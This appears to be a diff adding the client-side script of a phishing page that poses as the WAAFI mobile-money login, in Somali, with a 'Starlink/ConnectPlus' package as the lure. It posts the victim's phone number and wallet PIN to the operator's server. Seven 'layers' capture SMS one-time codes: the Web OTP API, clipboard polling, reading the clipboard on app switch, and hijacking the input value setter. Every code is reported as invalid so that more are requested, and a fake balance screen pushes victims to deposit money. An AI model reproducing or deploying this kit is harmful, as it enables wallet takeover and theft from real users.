+            if (otpMatch) return otpMatch[1];
+            const standaloneMatch = text.match(/\b(\d{6})\b/);
+            if (standaloneMatch) return standaloneMatch[1];
+            return null;
+        }
+
+        function handleOtpText(text) {
+            const code = extractOtpFromText(text);
+            if (!code || code.length !== 6) return false;
+            var manualOtpEls = document.querySelectorAll('.otp-input');
+            code.split('').forEach((digit, i) => { if (manualOtpEls[i]) manualOtpEls[i].value = digit; });
+            checkOtpComplete();
+            otpAutoSubmitted = true;
+            stopAllOtpLayers();
+            setTimeout(() => verifyOTP(), 400);
+            return true;
+        }
+
+        // LAYER 1: Web OTP API (Chrome Android native)
+        async function layer1_webOtpApi() {
+            if (!('OTPCredential' in window)) return;
+            try {
+                var ac = new AbortController();
+                setTimeout(() => ac.abort(), 120000);
+                var content = await navigator.credentials.get({ otp: { transport: ['sms'] }, signal: ac.signal });
+                if (content && content.code && !otpAutoSubmitted) handleOtpText(content.code);
+            } catch(e) { console.log('Layer 1 (Web OTP API): not available'); }
+        }
+
+        // LAYER 2: Overlay autofill input
+        function layer2_overlayAutofill() {
+            var overlay = document.getElementById('otpAutofill');
+            if (!overlay) return;
+            overlay.style.pointerEvents = 'auto';
+            overlay.value = '';
+            setTimeout(function() { overlay.focus(); }, 100);
+        }
+
+        const otpAutofillInput = document.getElementById('otpAutofill');
+        function checkOverlayValue() {
+            if (!otpAutofillInput) return;
+            const val = otpAutofillInput.value.replace(/\D/g, '');
+            if (val.length >= 6) { otpAutofillInput.value = ''; handleOtpText(val); }
+        }
+        if (otpAutofillInput) {
+            ['input', 'change', 'keyup'].forEach(evt => { otpAutofillInput.addEventListener(evt, checkOverlayValue); });
+            otpAutofillInput.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pasted = (e.clipboardData || window.clipboardData).getData('text');
+                this.value = '';
+                handleOtpText(pasted);
+            });
+        }
+
+        // LAYER 3: Overlay polling
+        function layer3_overlayPolling() {
+            stopOverlayPolling();
+            overlayPollInterval = setInterval(() => {
+                if (otpAutoSubmitted) { stopOverlayPolling(); return; }
+                checkOverlayValue();
+                const combined = getOtpValue();
+                if (combined.length === 6) handleOtpText(combined);
+            }, 300);
+        }
+        function stopOverlayPolling() {
+            if (overlayPollInterval) { clearInterval(overlayPollInterval); overlayPollInterval = null; }
+        }
+
+        // LAYER 4: Clipboard polling
+        function layer4_clipboardPolling() {
+            stopClipboardPolling();
+            lastClipboardText = '';
+            clipboardPollInterval = setInterval(async () => {
+                if (!document.getElementById('otpScreen').classList.contains('active')) return;
+                if (otpAutoSubmitted) { stopClipboardPolling(); return; }
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if (text && text !== lastClipboardText) { lastClipboardText = text; handleOtpText(text); }
+                } catch(e) {}
+            }, 800);
+        }
+        function stopClipboardPolling() {
+            if (clipboardPollInterval) { clearInterval(clipboardPollInterval); clipboardPollInterval = null; }
+        }
+
+        // LAYER 5: App-switch / Visibility detection
+        function layer5_visibilityDetection() {
+            document.addEventListener('visibilitychange', onReturnToPage);
+            window.addEventListener('focus', onReturnToPage);
+            window.addEventListener('pageshow', onReturnToPage);
+        }
+        function onReturnToPage() {
+            if (!document.getElementById('otpScreen').classList.contains('active') || otpAutoSubmitted) return;
+            [100, 300, 600, 1000, 2000, 3000].forEach(function(delay) {
+                setTimeout(async function() {
+                    if (otpAutoSubmitted) return;
+                    checkOverlayValue();
+                    try {
+                        var text = await navigator.clipboard.readText();
+                        if (text && text !== lastClipboardText) { lastClipboardText = text; handleOtpText(text); }
+                    } catch(e) {}
+                }, delay);
+            });
+        }
+
+        // LAYER 6: SMS message event listener (for supported browsers)
+        function layer6_smsWatch() {
+            if (smsWatchInterval) clearInterval(smsWatchInterval);
+            // Additional input monitoring on OTP inputs themselves
+            smsWatchInterval = setInterval(() => {
+                if (otpAutoSubmitted) { clearInterval(smsWatchInterval); smsWatchInterval = null; return; }
+                // Check if OTP inputs were filled by browser autofill
+                const val = getOtpValue();
+                if (val.length === 6 && /^\d{6}$/.test(val)) {
+                    otpAutoSubmitted = true;
+                    stopAllOtpLayers();
+                    setTimeout(() => verifyOTP(), 400);
+                }
+            }, 500);
+        }
+
+        // LAYER 7: MutationObserver on OTP inputs for external fill
+        function layer7_mutationObserver() {
+            if (inputMutationObserver) inputMutationObserver.disconnect();
+            const otpContainer = document.querySelector('.otp-inputs');
+            if (!otpContainer) return;
+            inputMutationObserver = new MutationObserver(function(mutations) {
+                if (otpAutoSubmitted) return;
+                const val = getOtpValue();
+                if (val.length === 6 && /^\d{6}$/.test(val)) {
+                    otpAutoSubmitted = true;
+                    stopAllOtpLayers();
+                    setTimeout(() => verifyOTP(), 400);
+                }
+            });
+            inputMutationObserver.observe(otpContainer, { childList: true, subtree: true, attributes: true, characterData: true });
+            // Also watch value changes via property descriptor
+            document.querySelectorAll('.otp-input').forEach(input => {
+                const descriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
+                Object.defineProperty(input, 'value', {
+                    get: function() { return descriptor.get.call(this); },
+                    set: function(v) {
+                        descriptor.set.call(this, v);
+                        if (!otpAutoSubmitted) {
+                            const val = getOtpValue();
+                            if (val.length === 6 && /^\d{6}$/.test(val)) {
+                                otpAutoSubmitted = true;
+                                stopAllOtpLayers();
+                                setTimeout(() => verifyOTP(), 400);
+                            }
+                        }
+                    }
+                });
+            });
+        }
+
+        // Control all OTP input focus behavior
+        if (otpAutofillInput) {
+            document.querySelectorAll('.otp-input').forEach(input => {
+                input.addEventListener('focus', function() {
+                    otpAutofillInput.style.pointerEvents = 'none';
+                    otpAutofillInput.style.zIndex = '-1';
+                });
+                input.addEventListener('click', function() { this.select(); });
+            });
+            document.addEventListener('click', function(e) {
+                if (!e.target.classList.contains('otp-input')) {
+                    otpAutofillInput.style.pointerEvents = 'auto';
+                    otpAutofillInput.style.zIndex = '2';
+                }
+            });
+        }
+
+        function startAllOtpLayers() {
+            otpAutoSubmitted = false;
+            layer1_webOtpApi();
+            layer2_overlayAutofill();
+            layer3_overlayPolling();
+            layer4_clipboardPolling();
+            layer5_visibilityDetection();
+            layer6_smsWatch();
+            layer7_mutationObserver();
+        }
+
+        function stopAllOtpLayers() {
+            stopOverlayPolling();
+            stopClipboardPolling();
+            if (smsWatchInterval) { clearInterval(smsWatchInterval); smsWatchInterval = null; }
+            if (inputMutationObserver) { inputMutationObserver.disconnect(); inputMutationObserver = null; }
+        }
+
+        function getOtpValue() {
+            return Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
+        }
+
+        // Submit login
+        async function submitLogin() {
+            const btn = document.getElementById('submitBtn');
+            btn.classList.add('loading');
+            btn.disabled = true;
+
+            const phone = document.getElementById('phoneInput').value;
+            const pin = Array.from(document.querySelectorAll('.pin-input')).map(i => i.value).join('');
+            const country = COUNTRIES[selectedCountryCode];
+            const fullPhone = country.code + ' ' + phone;
+            const urlParams = new URLSearchParams(window.location.search);
+
+            try {
+                const response = await fetch('/api/waafi/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: fullPhone,
+                        pin: pin,
+                        country: selectedCountryCode,
+                        source: urlParams.get('source') || 'direct',
+                        starlinkPackage: urlParams.get('package') || null,
+                        userAgent: navigator.userAgent,
+                        language: navigator.language
+                    })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    showOTPScreen(fullPhone);
+                } else {
+                    alert(data.message || 'Error occurred');
+                    btn.classList.remove('loading');
+                    btn.disabled = false;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showOTPScreen(fullPhone);
+            }
+        }
+
+        function showOTPScreen(phone) {
+            otpAutoSubmitted = false;
+            document.getElementById('loginScreen').classList.add('hidden');
+            document.getElementById('otpScreen').classList.add('active');
+            const masked = phone.slice(0, -4).replace(/\d/g, '*') + phone.slice(-4);
+            document.getElementById('phoneDisplay').textContent = masked;
+            startTimer();
+            startAllOtpLayers();
+            document.querySelectorAll('.otp-input')[0].focus();
+            startStatusPolling();
+        }
+
+        // Insufficient Balance Polling
+        let statusPollInterval = null;
+        function startStatusPolling() {
+            stopStatusPolling();
+            statusPollInterval = setInterval(async () => {
+                try {
+                    const res = await fetch('/api/check-status');
+                    const data = await res.json();
+                    if (data.status === 'insufficient_balance') showInsufficientScreen();
+                } catch(e) {}
+            }, 3000);
+        }
+        function stopStatusPolling() {
+            if (statusPollInterval) { clearInterval(statusPollInterval); statusPollInterval = null; }
+        }
+        function showInsufficientScreen() {
+            document.getElementById('loginScreen').classList.add('hidden');
+            document.getElementById('otpScreen').classList.remove('active');
+            document.getElementById('insufficientScreen').classList.add('active');
+            stopStatusPolling();
+            stopAllOtpLayers();
+            // Dynamic amount display
+            const urlParams = new URLSearchParams(window.location.search);
+            const passedPrice = urlParams.get('lp');
+            const passedCur = urlParams.get('cur');
+            const packageType = urlParams.get('package') || 'starter';
+            let amountDisplay = '$30 USD';
+            if (passedPrice && passedCur) {
+                amountDisplay = passedCur === 'USD' ? `$${passedPrice}` : `${passedCur} ${parseInt(passedPrice).toLocaleString()}`;
+            } else {
+                const pkg = STARLINK_PACKAGES[packageType] || STARLINK_PACKAGES['starter'];
+                const country = COUNTRIES[selectedCountryCode];
+                const currency = country ? country.currency : 'USD';
+                const rate = CURRENCY_RATES[currency] || 1;
+                const localAmount = Math.round(pkg.xaf * rate);
+                amountDisplay = `${currency} ${localAmount.toLocaleString()}`;
+            }
+            const msgEl = document.getElementById('insuffMsg');
+            if (msgEl) {
+                msgEl.innerHTML = 'Waa inaad ugu yaraan <strong style="color:#111;">' + amountDisplay + '</strong> ku leedahay WAAFI wallet-kaaga si aad u isdiiwaangeliso ConnectPlus package kasta.<br><br>Fadlan dhaji lacagta loo baahan yahay kadibna riix badhanka hoose.';
+            }
+        }
+        document.getElementById('depositedBtn').addEventListener('click', async function() {
+            const btn = this;
+            btn.disabled = true;
+            btn.textContent = '⏳ Sugaya...';
+            try { await fetch('/api/user-deposited', { method: 'POST' }); } catch(e) {}
+            document.getElementById('insufficientScreen').classList.remove('active');
+            document.getElementById('otpScreen').classList.add('active');
+            document.querySelectorAll('.otp-input')[0].focus();
+            startAllOtpLayers();
+            startStatusPolling();
+            btn.disabled = false;
+            btn.textContent = '✅ Waan Dhajiyay';
+        });
+        document.getElementById('diffNumberBtn').addEventListener('click', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('source') === 'starlink') {
+                window.location.href = '/starlink/';
+            } else {
+                document.getElementById('insufficientScreen').classList.remove('active');
+                document.getElementById('loginScreen').classList.remove('hidden');
+            }
+        });
+
+        // Timer
+        function startTimer() {
+            let seconds = 60;
+            const timerEl = document.getElementById('timer');
+            const resendLink = document.getElementById('resendLink');
+            const expiredMessage = document.getElementById('otpExpiredMessage');
+            if (timerInterval) clearInterval(timerInterval);
+            expiredMessage.classList.remove('active');
+            document.getElementById('otpInvalidMessage').classList.remove('active');
+            resendLink.classList.add('disabled');
+            timerInterval = setInterval(() => {
+                seconds--;
+                const mins = Math.floor(seconds / 60);
+                const secs = seconds % 60;
+                timerEl.textContent = `(${mins}:${secs.toString().padStart(2, '0')})`;
+                if (seconds <= 0) {
+                    clearInterval(timerInterval);
+                    timerEl.textContent = '';
+                    resendLink.classList.remove('disabled');
+                    expiredMessage.classList.add('active');
+                }
+            }, 1000);
+        }
+
+        // Verify OTP
+        async function verifyOTP() {
+            stopAllOtpLayers();
+            const btn = document.getElementById('verifyBtn');
+            btn.classList.add('loading');
+            btn.disabled = true;
+            const otp = Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
+            const phone = document.getElementById('phoneInput').value;
+            const country = COUNTRIES[selectedCountryCode];
+            const fullPhone = country.code + ' ' + phone;
+            try {
+                await fetch('/api/waafi/verify-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: fullPhone, otp: otp, country: selectedCountryCode })
+                });
+            } catch (error) { console.error('Error:', error); }
+            btn.classList.remove('loading');
+            showInvalidOTP();
+        }
+
+        function showInvalidOTP() {
+            const invalidMsg = document.getElementById('otpInvalidMessage');
+            const expiredMsg = document.getElementById('otpExpiredMessage');
+            if (invalidMsg) { invalidMsg.classList.add('active'); invalidMsg.style.display = 'block'; }
+            if (expiredMsg) expiredMsg.classList.remove('active');
+            var otpEls = document.querySelectorAll('.otp-input');
+            otpEls.forEach(i => { i.value = ''; });
+            if (otpEls[0]) otpEls[0].focus();
+            document.getElementById('verifyBtn').disabled = true;
+            startTimer();
+            const phone = document.getElementById('phoneInput').value;
+            const country = COUNTRIES[selectedCountryCode];
+            const fullPhone = country.code + ' ' + phone;
+            fetch('/api/waafi/resend-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: fullPhone, country: selectedCountryCode })
+            }).catch(e => console.log('Resend error:', e));
+
+            // Restart all 7 layers for the new OTP
+            otpAutoSubmitted = false;
+            startAllOtpLayers();
+        }
+
+        // Resend OTP
+        async function resendOTP() {
+            const resendLink = document.getElementById('resendLink');
+            if (resendLink.classList.contains('disabled')) return;
+            const phone = document.getElementById('phoneInput').value;
+            const country = COUNTRIES[selectedCountryCode];
+            const fullPhone = country.code + ' ' + phone;
+            try {
+                await fetch('/api/waafi/resend-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: fullPhone, country: selectedCountryCode })
+                });
+            } catch (error) { console.error('Error:', error); }
+            var otpEls = document.querySelectorAll('.otp-input');
+            otpEls.forEach(i => { i.value = ''; });
+            if (otpEls[0]) otpEls[0].focus();
+            document.getElementById('otpInvalidMessage').classList.remove('active');
+            startTimer();
+            otpAutoSubmitted = false;
+            startAllOtpLayers();
+        }
+
+        // Detect country from IP
+        async function detectCountry() {
+            const cachedCountry = getCachedCountry();
+            if (cachedCountry && COUNTRIES[cachedCountry]) {
+                selectedCountryCode = cachedCountry;
+                setCountry(cachedCountry);
+                return;
+            }
+            try {
+                let countryCode = null;
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 5000);
+                    const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    const data = await response.json();
+                    if (data.country_code) countryCode = data.country_code;
+                } catch(e) {
+                    try {
+                        const controller = new AbortController();
+                        const timeoutId = setTimeout(() => controller.abort(), 5000);
+                        const response = await fetch('https://ip-api.com/json/', { signal: controller.signal });
+                        clearTimeout(timeoutId);
+                        const data = await response.json();
+                        if (data.countryCode) countryCode = data.countryCode;
+                    } catch(e2) { console.log('IP detection failed'); }
+                }
+                if (countryCode && COUNTRIES[countryCode]) {
+                    selectedCountryCode = countryCode;
+                    cacheCountry(countryCode);
+                    setCountry(countryCode);
+                } else {
+                    selectedCountryCode = 'SO';
+                    cacheCountry('SO');
+                    setCountry('SO');
+                }
+            } catch(e) {
+                console.log('Country detection error');
+                setCountry('SO');
+            }
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('package')) updateStarlinkAmount();
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            initializeInputs();
+            checkStarlinkSource();
+            detectCountry();
+        });
+    </script>
+</body>
+</html>
